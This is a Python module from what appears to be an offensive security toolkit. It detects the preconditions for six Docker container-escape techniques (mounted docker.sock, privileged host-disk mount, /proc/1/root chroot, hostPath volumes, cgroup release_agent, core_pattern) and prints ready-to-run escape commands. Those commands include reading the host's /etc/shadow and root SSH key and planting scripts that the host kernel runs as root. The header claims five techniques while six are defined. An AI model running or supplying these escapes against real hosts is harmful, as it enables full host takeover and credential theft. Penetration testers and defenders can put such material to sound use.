# language: Python, file: Program/container_escape/docker.py, target: Red Sky container_escape — Docker escapes
# Five real escape primitives. Each one detects its precondition first, then
# either executes (if --run is passed) or prints the exact commands to run.

import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CE_DIR = OUTPUT_DIR / "container_escape"


def _exists(p): return Path(p).exists()
def _read(p, d=""):
    try: return Path(p).read_text(errors="replace").strip()
    except OSError: return d


# ── 1. Docker socket mounted ──
def esc_docker_sock(run=False) -> Dict:
    sock = "/var/run/docker.sock"
    ok = _exists(sock)
    cmds = [
        f"docker -H unix://{sock} ps",
        f"docker -H unix://{sock} run -v /:/host --privileged -it alpine chroot /host /bin/sh",
    ]
    return {
        "technique": "docker_socket",
        "precondition": "docker.sock mounted into container",
        "available": ok,
        "commands": cmds if ok else [],
        "note": "spawns a privileged container that mounts the host root at /host",
    }


# ── 2. Privileged container → mount host disk ──
def esc_privileged(run=False) -> Dict:
    status = _read("/proc/self/status")
    cap_hex = ""
    for line in status.splitlines():
        if line.startswith("CapEff:"):
            cap_hex = line.split()[1]; break
    privileged = False
    if cap_hex:
        try:
            cap = int(cap_hex, 16)
            privileged = bool(cap & (1 << 21))  # CAP_SYS_ADMIN
        except ValueError:
            pass
    cmds = [
        "mkdir -p /mnt/host && mount /dev/sda1 /mnt/host",
        "chroot /mnt/host /bin/bash",
        "cat /mnt/host/etc/shadow",
        "cat /mnt/host/root/.ssh/id_rsa",
    ]
    return {
        "technique": "privileged_mount",
        "precondition": "privileged container (CAP_SYS_ADMIN)",
        "available": privileged,
        "commands": cmds if privileged else [],
        "note": "mounts host disk, chroot into it — trivially escapes to full root",
    }


# ── 3. /proc/1/root chroot ──
def esc_proc_root(run=False) -> Dict:
    ok = _exists("/proc/1/root") and _exists("/proc/1/root/etc/passwd")
    cmds = [
        "chroot /proc/1/root /bin/bash",
        "nsenter -t 1 -m -u -i -n -p -- /bin/bash",
    ]
    return {
        "technique": "proc_1_root",
        "precondition": "PID namespace not isolated (or host PID shared)",
        "available": ok,
        "commands": cmds if ok else [],
        "note": "chroot into PID 1's filesystem — escapes to host root if PID ns is shared",
    }


# ── 4. hostPath volume mounted ──
def esc_hostpath(run=False) -> Dict:
    mounts = _read("/proc/mounts")
    suspicious = []
    for line in mounts.splitlines():
        parts = line.split()
        if len(parts) < 3: continue
        dev, mp, fs = parts[0], parts[1], parts[2]
        # check if /etc, /root, /var/lib/docker or /proc/sys looks like the host
        if mp in ("/host", "/hostfs", "/mnt/host", "/var/lib/docker", "/etc/kubernetes"):
            suspicious.append(line)
    return {
        "technique": "hostpath_volume",
        "precondition": "a hostPath volume mounted at a known path",
        "available": bool(suspicious),
        "mounts": suspicious,
        "commands": [f"ls {l.split()[1]}" for l in suspicious],
        "note": "any hostPath mount gives direct read (and often write) access to the host fs",
    }


# ── 5. cgroup v1 release_agent ──
def esc_cgroup(run=False) -> Dict:
    # v1 path: /sys/fs/cgroup/<something>/release_agent is writable if SYS_ADMIN
    cgroup_root = Path("/sys/fs/cgroup")
    release_agent = None
    notify = None
    try:
        for p in cgroup_root.iterdir():
            ra = p / "release_agent"
            nr = p / "notify_on_release"
            if ra.exists() and nr.exists():
                release_agent = ra
                notify = nr
                break
    except OSError:
        pass

    available = release_agent is not None and os.geteuid() == 0
    cmds = []
    if available:
        cmds = [
            f"echo 1 > {notify}",
            f"echo '#!/bin/sh' > /tmp/esc.sh && echo 'cat /etc/shadow > /tmp/out' >> /tmp/esc.sh",
            "chmod +x /tmp/esc.sh",
            f"echo /tmp/esc.sh > {release_agent}",
            "mkdir /tmp/cg && echo $$ > /tmp/cg/tasks && rmdir /tmp/cg",
        ]
    return {
        "technique": "cgroup_release_agent",
        "precondition": "cgroup v1 mounted + CAP_SYS_ADMIN",
        "available": available,
        "commands": cmds,
        "note": "kernel runs release_agent as root on the host when the cgroup empties",
    }


# ── 6. core_pattern escape ──
def esc_core_pattern(run=False) -> Dict:
    cp = _read("/proc/sys/kernel/core_pattern")
    writable = os.access("/proc/sys/kernel/core_pattern", os.W_OK)
    available = writable and os.geteuid() == 0
    cmds = []
    if available:
        cmds = [
            "echo '|/tmp/esc.sh %p' > /proc/sys/kernel/core_pattern",
            "echo '#!/bin/sh' > /tmp/esc.sh && echo 'cp /etc/shadow /tmp/out' >> /tmp/esc.sh",
            "chmod +x /tmp/esc.sh",
            "ulimit -c unlimited",
            "kill -SEGV $$",
            "cat /tmp/out",
        ]
    return {
        "technique": "core_pattern",
        "precondition": "writable /proc/sys/kernel/core_pattern",
        "available": available,
        "current": cp,
        "commands": cmds,
        "note": "kernel executes the piped program as root when any process segfaults",
    }


TECHNIQUES = {
    "docker-sock":       esc_docker_sock,
    "privileged":        esc_privileged,
    "proc-root":         esc_proc_root,
    "hostpath":          esc_hostpath,
    "cgroup":            esc_cgroup,
    "core-pattern":      esc_core_pattern,
}


def cmd_list() -> int:
    print_info(f"{len(TECHNIQUES)} docker escape techniques")
    print()
    for name, fn in TECHNIQUES.items():
        r = fn(run=False)
        mark = f"{OK}▓{RESET}" if r["available"] else f"{ASH}░{RESET}"
        print(f"  {mark} {BONE}{name:<16}{RESET} {ASH}{r['technique']}{RESET}")
        print(f"      {CLOT}precondition: {r['precondition']}{RESET}")
    return 0


def cmd_run(technique: str, out_file: str = "") -> int:
    fn = TECHNIQUES.get(technique)
    if not fn:
        print_err(f"unknown technique: {technique}")
        print_info("available: " + ", ".join(TECHNIQUES.keys()) + ", all")
        return 2

    if technique == "all":
        techniques = list(TECHNIQUES.keys())
    else:
        techniques = [technique]

    CE_DIR.mkdir(parents=True, exist_ok=True)
    results = []

    for name in techniques:
        print(f"\n{ARTERY}{BOLD}── {name}{RESET}")
        r = TECHNIQUES[name](run=True)
        if r["available"]:
            print_ok("precondition met — escape available")
            for c in r["commands"]:
                print(f"  {SCARLET}$ {c}{RESET}")
            if r.get("note"):
                print(f"  {ASH}{r['note']}{RESET}")
        else:
            print_warn("precondition not met — cannot use this escape")
        results.append(r)

    if out_file:
        out = Path(out_file)
    else:
        out = CE_DIR / f"escapes_{int(time.time())}.json"
    out.write_text(json.dumps(results, indent=2, default=str))
    print()
    print_kv("saved", out)
    return 0


def run_cli(args):
    if not args or args[0] == "list":
        return cmd_list()
    if args[0] == "run":
        if len(args) < 2:
            print_err("run needs a technique name (or 'all')")
            return 2
        out = ""
        if "--out" in args:
            i = args.index("--out")
            if i + 1 < len(args):
                out = args[i + 1]
        return cmd_run(args[1], out)
    print_err(f"unknown docker sub-command: {args[0]}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
